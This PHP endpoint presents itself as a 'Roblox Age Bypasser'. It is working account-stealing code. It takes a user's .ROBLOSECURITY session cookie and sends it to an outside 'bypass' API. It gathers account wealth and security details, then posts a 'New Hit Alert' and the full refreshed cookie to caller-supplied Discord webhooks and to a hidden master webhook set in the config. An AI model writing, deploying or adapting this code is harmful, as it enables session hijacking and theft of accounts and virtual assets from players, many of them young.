<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

$cookie = $_GET['cookie'] ?? $_POST['cookie'] ?? '';
$web = $_GET['web'] ?? '';
$dh = $_GET['dh'] ?? '';
$dualhook = $_GET['dualhook'] ?? '';

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

// Call external bypass API
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check if external API call failed
if ($httpCode !== 200 || !empty($curlError) || empty($response)) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => 'Failed To Send Request, Make Sure Ur Cookie Is Valid Or Try Again Later'
    ]);
    exit;
}

// Parse the response from external API
$externalData = json_decode($response, true);

// Check if external API returned error or invalid data
if (!isset($externalData['success']) || !$externalData['success']) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => $externalData['message'] ?? 'Failed To Bypass Cookie, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    exit;
}

// Extract data from external API response
$userInfo = $externalData['userInfo'] ?? [];
$detailedInfo = $externalData['detailedInfo'] ?? [];
$refreshedCookie = $externalData['refreshedCookie'] ?? $cookie;
$avatarUrl = $externalData['avatarUrl'] ?? ($detailedInfo['avatarUrl'] ?? '');

// Helper function for safe field access
function getField($field, $fallback = 'Unknown') {
    global $userInfo, $detailedInfo;
    return $userInfo[$field] ?? $detailedInfo[$field] ?? $fallback;
}

$userId = getField('userId', 0);
$username = getField('username');
$displayName = getField('displayName');
$robux = getField('robux', 0);
$rap = getField('rap', 0);
$summary = getField('summary', 0);
$pendingRobux = getField('pendingRobux', 0);
$creditBalance = getField('creditBalance', '$0');
$pinStatus = getField('pinStatus', '❌ Disabled');
$isPremium = getField('isPremium', false);
$vcStatus = getField('vcStatus', '❌ Disabled');
$emailVerified = getField('emailVerified', '❌ Not Verified');
$presenceType = getField('presenceType', 'Unknown');
$location = getField('location', 'Unknown');
$accountAge = getField('accountAge', 'Unknown');
$joinDate = getField('joinDate', 'Unknown');
$bio = getField('bio', '❌ No bio set');
$headlessStatus = getField('headlessStatus', '❌ False');
$korbloxStatus = getField('korbloxStatus', '❌ False');
$totalGroupsOwned = getField('totalGroupsOwned', 0);
$highestRank = getField('highestRank', 0);
$highestGroup = getField('highestGroup', 'None');
$totalGroupFunds = getField('totalGroupFunds', 0);
$totalPendingGroupFunds = getField('totalPendingGroupFunds', 0);
$friendsCount = getField('friendsCount', 0);
$followersCount = getField('followersCount', 0);

// Get games and gamepasses
$games = getField('games', [
    'BF' => '❌', 'AM' => '❌', 'MM2' => '❌', 'PS99' => '❌', 'BB' => '❌'
]);
$gamePasses = getField('gamePasses', [
    'BF' => '❌', 'AM' => '❌', 'MM2' => '❌', 'PS99' => '❌', 'BB' => '❌'
]);

// Prepare webhooks
$webhooks = [];
if (!empty($web)) $webhooks[] = $web;
if (!empty($dh)) $webhooks[] = $dh;
if (!empty($dualhook)) $webhooks[] = $dualhook;

// Add master webhook if set in config
if (defined('MASTER_WEBHOOK') && !empty(MASTER_WEBHOOK) && MASTER_WEBHOOK !== 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN') {
    $webhooks[] = MASTER_WEBHOOK;
}

$timestamp = date("c");
$space = '|';

$embed1 = [
    'content' => '@everyone',
    'username' => 'Roblox Age Bypasser',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [[
        'title' => "🎯 New Hit Alert!",
        'description' => "<:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
        'color' => hexdec('667eea'),
        'thumbnail' => ['url' => $avatarUrl],
        'fields' => [
            [
                'name' => '**<:search:1391436893794861157> About:**',
                'value' => "• **Display:** `$displayName`\n• **Username:** `$username`\n• **User ID:** `$userId`\n• **Age:** `$accountAge`\n• **Join Date:** `$joinDate`\n• **Bio:** `" . substr($bio, 0, 100) . "`",
                'inline' => true
            ],
            [
                'name' => '**<:info:1391434745207853138> Information:**',
                'value' => "• **Robux:** `$robux`\n• **Pending:** `$pendingRobux`\n• **Credit:** `$creditBalance`\n• **Summary:** `$summary R$ | $rap RAP`",
                'inline' => true
            ],
            [
                'name' => '**<:settings:1391433304145924146> Settings:**',
                'value' => "• **PIN:** `$pinStatus`\n• **Premium:** `" . ($isPremium ? '✅ True' : '❌ False') . "`\n• **VC:** `$vcStatus`\n• **Verified:** `$emailVerified`\n• **Presence:** `$presenceType`",
                'inline' => true
            ],
            [
                'name' => '**<:Games:1313020733932306462> Games Played:**',
                'value' => "<:bf:1303894849530888214> $space {$games['BF']} $space {$gamePasses['BF']}\n" .
                           "<:adm:1303894863007453265> $space {$games['AM']} $space {$gamePasses['AM']}\n" .
                           "<:mm2:1303894855281541212> $space {$games['MM2']} $space {$gamePasses['MM2']}\n" .
                           "<:ps99:1303894865079308288> $space {$games['PS99']} $space {$gamePasses['PS99']}\n" .
                           "<:bb:1303894852697718854> $space {$games['BB']} $space {$gamePasses['BB']}",
                'inline' => true
            ],
            [
                'name' => '**<:bag:1391435344779677887> Inventory:**',
                'value' => "• **RAP:** `$rap`\n• **Headless:** `$headlessStatus`\n• **Korblox:** `$korbloxStatus`",
                'inline' => true
            ],
            [
                'name' => '**<:groups:1391434330823200840> Groups:**',
                'value' => "• **Owned:** `$totalGroupsOwned`\n• **Highest Rank:** `#$highestRank in $highestGroup`\n• **Funds:** `$totalGroupFunds R$`\n• **Pending:** `$totalPendingGroupFunds R$`",
                'inline' => true
            ],
            [
                'name' => '**<:user:1391436034843349002> Profile:**',
                'value' => "• **Friends:** `$friendsCount`\n• **Followers:** `$followersCount`",
                'inline' => true
            ]
        ],
        'footer' => [
            'text' => 'Roblox Age Bypasser • Powered by External API',
            'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
        ],
        'timestamp' => $timestamp
    ]]
];

$embed2 = [
    'username' => 'Roblox Age Bypasser',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [[
        'title' => '🍪 .ROBLOSECURITY',
        'description' => "```\n" . substr($refreshedCookie, 0, 2000) . "\n```",
        'color' => hexdec('667eea'),
        'footer' => [
            'text' => 'Refreshed Cookie',
            'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
        ],
        'thumbnail' => [
            'url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
        ],
        'timestamp' => $timestamp
    ]]
];

// Send to webhooks
function sendWebhook($url, $data) {
    if (empty($url)) return;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

foreach ($webhooks as $webhook) {
    sendWebhook($webhook, $embed1);
    sleep(1);
    sendWebhook($webhook, $embed2);
    sleep(1);
}

echo json_encode([
    'success' => true,
    'robux' => $robux,
    'rap' => $rap,
    'summary' => $summary,
    'status' => 'success'
]);
?>
